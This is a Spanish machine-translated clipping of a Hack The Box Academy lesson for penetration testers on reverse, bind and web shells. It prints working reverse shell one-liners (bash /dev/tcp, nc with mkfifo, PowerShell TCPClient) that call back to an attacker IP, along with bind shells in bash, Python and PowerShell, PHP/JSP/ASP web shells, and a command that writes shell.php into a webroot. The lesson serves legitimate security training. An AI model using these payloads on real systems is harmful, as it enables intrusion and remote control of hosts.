---
title: "Types of Shells | Hack The Box Academy"
source: "https://academy.hackthebox.com/app/module/77/section/725"
author:
published:
created: 2026-05-28
description:
tags:
  - "clippings"
---
## Tipos de Shells

---

Una vez que comprometemos un sistema y explotamos una vulnerabilidad para ejecutar comandos en los hosts comprometidos de forma remota, generalmente necesitamos un método de comunicación con el sistema para no tener que seguir explotando la misma vulnerabilidad para ejecutar cada comando. Para enumerar el sistema o tomar mayor control sobre él o dentro de su red, necesitamos una conexión confiable que nos brinde acceso directo al shell del sistema, es decir, `Bash` o `PowerShell`, para que podamos investigar a fondo el sistema remoto para nuestro próximo movimiento.

Una forma de conectarse a un sistema comprometido es mediante protocolos de red, como `SSH` para Linux o `WinRM` para Windows, lo que nos permitiría iniciar sesión de forma remota en el sistema comprometido. Sin embargo, a menos que obtengamos un conjunto funcional de credenciales de inicio de sesión, no podremos utilizar estos métodos sin ejecutar primero comandos en el sistema remoto para obtener acceso a estos servicios en primer lugar.

El otro método para acceder a un host comprometido para el control y la ejecución remota de código es a través de shells.  
Como se discutió anteriormente, hay tres tipos principales de shells: Reverse Shell, Bind Shell y Web Shell. Cada uno de estos shells tiene un método diferente de comunicación con nosotros para aceptar y ejecutar nuestros comandos.

| Tipo de carcasa | Método de comunicación |
| --- | --- |
| `Reverse Shell` | Se conecta nuevamente a nuestro sistema y nos brinda control a través de una conexión inversa. |
| `Bind Shell` | Espera a que nos conectemos a él y nos da control una vez que lo hacemos. |
| `Web Shell` | Se comunica a través de un servidor web, acepta nuestros comandos a través de parámetros HTTP, los ejecuta e imprime la salida. |

Profundicemos en cada una de las conchas anteriores y repasemos ejemplos de cada una.

---

## Concha inversa

A `Reverse Shell` es el tipo de shell más común, ya que es el método más rápido y sencillo para obtener control sobre un host comprometido. Una vez que identificamos una vulnerabilidad en el host remoto que permite la ejecución remota de código, podemos iniciar una `netcat` oyente en nuestra máquina que escucha en un puerto específico, digamos puerto `1234`. Con este oyente en su lugar, podemos ejecutar un `reverse shell command` que conecta el shell del sistema remoto, es decir, `Bash` o `PowerShell` a nuestro `netcat` oyente, que nos da una conexión inversa a través del sistema remoto.

#### Oyente de Netcat

El primer paso es iniciar un `netcat` oyente en un puerto de nuestra elección:

```
shellsessionaalonso1190@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Las banderas que estamos usando son las siguientes:

| Bandera | Descripción |
| --- | --- |
| `-l` | Modo de escucha, para esperar a que una conexión se conecte con nosotros. |
| `-v` | Modo verboso, para que sepamos cuándo recibimos una conexión. |
| `-n` | Deshabilite la resolución DNS y conéctese solo desde/hacia IP para acelerar la conexión. |
| `-p 1234` | Número de puerto `netcat` está escuchando y se debe enviar la conexión inversa a. |

Ahora que tenemos un `netcat` oyente esperando una conexión, podemos ejecutar el comando de shell inverso que se conecta con nosotros.

#### Conectar la IP posterior

Sin embargo, primero debemos encontrar la IP de nuestro sistema para enviarnos una conexión inversa. Podemos encontrar nuestra IP con el siguiente comando:

```
shellsessionaalonso1190@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

En nuestro ejemplo, la IP que nos interesa está debajo `tun0`, que es la misma red HTB a la que nos conectamos a través de nuestra VPN.

Nota: Nos estamos conectando a la IP en 'tun0' porque solo podemos conectarnos a las cajas HackTheBox a través de la conexión VPN, ya que no tienen conexión a Internet y, por lo tanto, no pueden conectarse con nosotros a través de Internet usando \`eth0\`. En un pentest real, es posible que estés conectado directamente a la misma red o realizando una prueba de penetración externa, por lo que puedes conectarte a través del adaptador \`eth0\` o similar.

#### Comando de shell inverso

El comando que ejecutamos depende del sistema operativo en el que se ejecuta el host comprometido, es decir, Linux o Windows, y de las aplicaciones y comandos a los que podemos acceder. El [Carga útil de todas las cosas](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) La página tiene una lista completa de comandos de shell inverso que podemos usar y que cubren una amplia gama de opciones según nuestro host comprometido.

Ciertos comandos de shell inverso son más confiables que otros y generalmente se pueden intentar para obtener una conexión inversa. Los siguientes comandos son comandos confiables que podemos usar para obtener una conexión inversa, para `bash` en Linux hosts comprometidos y `Powershell` en hosts comprometidos de Windows:

```bash
bashbash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
bashrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
```powershell
Powershellpowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Podemos utilizar el exploit que tenemos sobre el host remoto para ejecutar uno de los comandos anteriores, es decir, a través de un exploit de Python o un módulo Metasploit, para obtener una conexión inversa. Una vez que lo hagamos, deberíamos recibir una conexión en nuestro `netcat` oyente:

```
shellsessionaalonso1190@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, después de recibir una conexión en nuestro `netcat` oyente, pudimos escribir nuestro comando y recuperar directamente su salida, directamente en nuestra máquina.

A `Reverse Shell` Es útil cuando queremos obtener una conexión rápida y confiable a nuestro host comprometido. Sin embargo, a `Reverse Shell` Puede ser muy frágil. Una vez que se detiene el comando de shell inverso, o si perdemos nuestra conexión por cualquier motivo, tendríamos que usar el exploit inicial para ejecutar el comando de shell inverso nuevamente para recuperar nuestro acceso.

---

## Carcasa de enlace

Otro tipo de concha es una `Bind Shell`. A diferencia de a `Reverse Shell` que se conecta con nosotros, tendremos que conectarnos a él en el `targets'` puerto de escucha.

Una vez que ejecutamos a `Bind Shell Command`, comenzará a escuchar en un puerto del host remoto y vinculará el shell de ese host, es decir, `Bash` o `PowerShell`, a ese puerto. Tenemos que conectarnos a ese puerto con `netcat`, y obtendremos el control a través de un shell en ese sistema.

---

#### Comando Bind Shell

Una vez más, podemos utilizarlo [Carga útil de todas las cosas](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) para encontrar un comando adecuado para iniciar nuestro shell de enlace.

Nota: iniciaremos una conexión de escucha en el puerto '1234' del host remoto, con IP '0.0.0.0' para que podamos conectarnos a él desde cualquier lugar.

Los siguientes son comandos confiables que podemos usar para iniciar un shell de enlace:

```bash
bashrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```python
pythonpython -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
```powershell
powershellpowershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

---

#### Conexión Netcat

Una vez que ejecutamos el comando bind shell, deberíamos tener un shell esperándonos en el puerto especificado. Ahora podemos conectarnos a él.

Podemos usar `netcat` para conectarse a ese puerto y obtener una conexión al shell:

```
shellsessionaalonso1190@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, nos colocan directamente en una sesión bash y podemos interactuar directamente con el sistema de destino. A diferencia de a `Reverse Shell`, si eliminamos nuestra conexión a un shell de enlace por cualquier motivo, podemos volver a conectarnos a él y obtener otra conexión inmediatamente. Sin embargo, si el comando bind shell se detiene por cualquier motivo, o si se reinicia el host remoto, aún perderíamos nuestro acceso al host remoto y tendremos que explotarlo nuevamente para obtener acceso.

---

#### Actualización de TTY

Una vez que nos conectamos a un shell a través de Netcat, notaremos que solo podemos escribir comandos o retroceder, pero no podemos mover el cursor de texto hacia la izquierda o hacia la derecha para editar nuestros comandos, ni podemos subir y bajar para acceder al historial de comandos. Para poder hacer eso, necesitaremos actualizar nuestro TTY. Esto se puede lograr mapeando nuestro terminal TTY con el TTY remoto.

Existen múltiples métodos para hacer esto. Para nuestros propósitos, utilizaremos el `python/stty` método. En nuestro `netcat` shell, usaremos el siguiente comando para usar Python para actualizar el tipo de nuestro shell a un TTY completo:

```
shellsessionaalonso1190@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Después de ejecutar este comando, presionaremos `ctrl+z` para poner en segundo plano nuestro shell y volver a nuestra terminal local, e ingrese lo siguiente `stty` comando:

```
shellsessionwww-data@remotehost$ ^Z

[1] Stopped                 nc -lvnp 1234
aalonso1190@htb[/htb]$ stty raw -echo
aalonso1190@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Una vez que golpeamos `fg`, traerá de vuelta nuestro `netcat` concha al primer plano. En este punto, el terminal mostrará una línea en blanco. Podemos golpear `enter` nuevamente para volver a nuestro shell o entrada `reset` y presione enter para recuperarlo. En este punto, tendríamos un shell TTY completamente funcional con historial de comandos y todo lo demás.

Es posible que notemos que nuestro shell no cubre todo el terminal. Para solucionar esto, necesitamos descubrir algunas variables. Podemos abrir otra ventana de terminal en nuestro sistema, maximizar las ventanas o usar cualquier tamaño que queramos y luego ingresar los siguientes comandos para obtener nuestras variables:

```
shellsessionaalonso1190@htb[/htb]$ echo $TERM

xterm-256color
```
```
shellsessionaalonso1190@htb[/htb]$ stty size

67 318
```

El primer comando nos mostró el `TERM` variable, y la segunda nos muestra los valores para `rows` y `columns`, respectivamente. Ahora que tenemos nuestras variables, podemos volver a nuestras `netcat` shell y utilice el siguiente comando para corregirlos:

```
shellsessionwww-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Una vez que hagamos eso, deberíamos tener un `netcat` shell que utiliza todas las funciones del terminal, al igual que una conexión SSH.

---

## Concha web

El último tipo de concha que tenemos es una `Web Shell`. A `Web Shell` suele ser un script web, es decir, `PHP` o `ASPX`, que acepta nuestro comando a través de parámetros de solicitud HTTP como `GET` o `POST` solicita parámetros, ejecuta nuestro comando e imprime su salida nuevamente en la página web.

#### Cómo escribir un shell web

En primer lugar, necesitamos escribir nuestro shell web que lleve nuestro comando a través de un `GET` solicitarlo, ejecutarlo e imprimir su salida nuevamente. Un script de shell web suele ser de una sola línea, muy corto y que se puede memorizar fácilmente. Los siguientes son algunos scripts de shell web cortos comunes para lenguajes web comunes:

```php
PHP<?php system($_REQUEST["cmd"]); ?>
```
```
jsp<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```
asp<% eval request("cmd") %>
```

---

#### Subir un shell web

Una vez que tenemos nuestro shell web, necesitamos colocar nuestro script de shell web en el directorio web del host remoto (webroot) para ejecutar el script a través del navegador web. Esto puede deberse a una vulnerabilidad en una función de carga, que nos permitiría escribir uno de nuestros shells en un archivo, es decir `shell.php` y cárguelo, y luego acceda a nuestro archivo cargado para ejecutar comandos.

Sin embargo, si solo tenemos ejecución remota de comandos a través de un exploit, podemos escribir nuestro shell directamente en la raíz web para acceder a él a través de la web. Entonces, el primer paso es identificar dónde está la raíz web. Las siguientes son las raíces web predeterminadas para servidores web comunes:

| Servidor web | Raíz web predeterminada |
| --- | --- |
| `Apache` | /var/www/html/ |
| `Nginx` | /usr/local/nginx/html/ |
| `IIS` | c:\\inetpub\\wwwroot\\ |
| `XAMPP` | C:\\xampp\\htdocs\\ |

Podemos consultar estos directorios para ver qué webroot está en uso y luego usarlo `echo` para escribir nuestro shell web. Por ejemplo, si estamos atacando un host Linux que ejecuta Apache, podemos escribir un `PHP` shell con el siguiente comando:

```bash
bashecho '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

#### Accediendo a Web Shell

Una vez que escribimos nuestro shell web, podemos acceder a él a través de un navegador o usando `cURL`. Podemos visitar el `shell.php` página en el sitio web comprometido y uso `?cmd=id` para ejecutar el `id` comando:

http://SERVER\_IP:PORT/shell.php?cmd=id

![UID, GID y grupos configurados en www-data.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/write_shell_exec_1.png)

Otra opción es utilizar `cURL`:

```
shellsessionaalonso1190@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, podemos seguir cambiando el comando para obtener su salida. Una gran ventaja de un shell web es que evitaría cualquier restricción de firewall vigente, ya que no abrirá una nueva conexión en un puerto sino que se ejecutará en el puerto web `80` o `443`, o cualquier puerto que esté utilizando la aplicación web. Otro gran beneficio es que si se reinicia el host comprometido, el shell web seguirá en su lugar y podremos acceder a él y ejecutar el comando sin explotar nuevamente el host remoto.

Por otro lado, un shell web no es tan interactivo como los shells inversos y de enlace, ya que tenemos que seguir solicitando una URL diferente para ejecutar nuestros comandos. Aún así, en casos extremos, es posible codificar un `Python` script para automatizar este proceso y brindarnos un shell web semiinteractivo directamente dentro de nuestra terminal.